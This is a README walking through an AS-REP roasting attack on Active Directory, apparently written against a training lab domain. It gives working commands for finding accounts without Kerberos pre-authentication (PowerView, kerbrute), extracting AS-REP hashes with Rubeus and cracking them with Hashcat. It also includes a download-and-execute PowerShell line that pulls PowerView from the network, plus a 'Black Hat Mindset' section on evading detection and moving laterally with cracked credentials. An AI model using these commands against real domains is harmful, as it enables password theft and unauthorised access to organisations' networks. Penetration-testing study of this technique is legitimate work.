# Active Directory AS-REP Roasting README

This README focuses on exploiting accounts with the `DONT_REQ_PREAUTH` flag to extract AS-REP tickets and crack them offline for plaintext passwords.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Identifying Vulnerable Accounts](#identifying-vulnerable-accounts)
- [Performing AS-REP Roasting](#performing-as-rep-roasting)
- [Cracking AS-REP Tickets](#cracking-as-rep-tickets)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

AS-REP roasting targets Kerberos accounts with the `DONT_REQ_PREAUTH` flag, allowing attackers to request AS-REP tickets without initial authentication. These tickets, encrypted with the user's password hash, can be cracked offline. This guide uses PowerView, Rubeus, Hashcat, and kerbrute to identify and exploit these accounts.

## Setup and Prerequisites

- **Environment**: Windows host for PowerView and Rubeus; Linux host for Hashcat and kerbrute.
- **PowerView**: Load into memory on Windows (e.g., `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`).
- **Rubeus**: Download the executable on Windows (e.g., from its GitHub repo) and place in your working directory (e.g., `C:\Tools\`).
- **Hashcat**: Install on Linux (e.g., `apt install hashcat`) with a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).
- **kerbrute**: Download the binary on Linux (e.g., from its GitHub repo) and place in your working directory (e.g., `/opt/`).
- **PowerShell**: Run with appropriate privileges on Windows (right-click > "Run as Administrator").
- **Network Access**: Ensure connectivity to the target domain controller (e.g., 172.16.5.5).
- **User List**: Prepare a file (e.g., `/opt/jsmith.txt`) with usernames to enumerate.

## Identifying Vulnerable Accounts

Find users with the `DONT_REQ_PREAUTH` flag.

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
Uses PowerView to search for accounts with the `DONT_REQ_PREAUTH` flag in the target domain, displaying samaccountname, userprincipalname, and useraccountcontrol (Windows host).

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
Uses kerbrute to enumerate users in the inlanefreight.local domain and automatically retrieves AS-REP tickets for those without pre-authentication, using a user list from `/opt/jsmith.txt` (Linux host).

## Performing AS-REP Roasting

Extract AS-REP tickets for offline cracking.

```powershell
.Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
Uses Rubeus to perform an AS-REP roasting attack on the mmorgan user, formatting the output for Hashcat without wrapping (Windows host).

## Cracking AS-REP Tickets

Crack the extracted tickets to reveal plaintext passwords.

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
Uses Hashcat with mode 18200 (Kerberos 5 AS-REP) to crack the ilfreight_asrep hash file using the rockyou.txt wordlist (Linux host).

## Black Hat Mindset

- **Target Weak Accounts**: Focus on users with `DONT_REQ_PREAUTH` for easy ticket extraction.
- **Stay Undetected**: Perform roasting and cracking offline to avoid triggering Kerberos monitoring.
- **Optimize Cracking**: Use a strong wordlist like rockyou.txt to efficiently crack weaker passwords.
- **Expand Access**: Use cracked credentials to escalate privileges or move laterally.

## Resources

- [PowerView Documentation]()
- [Rubeus GitHub]()
- [Hashcat Documentation]()
- [kerbrute GitHub]()
- [AS-REP Roasting Explained]()

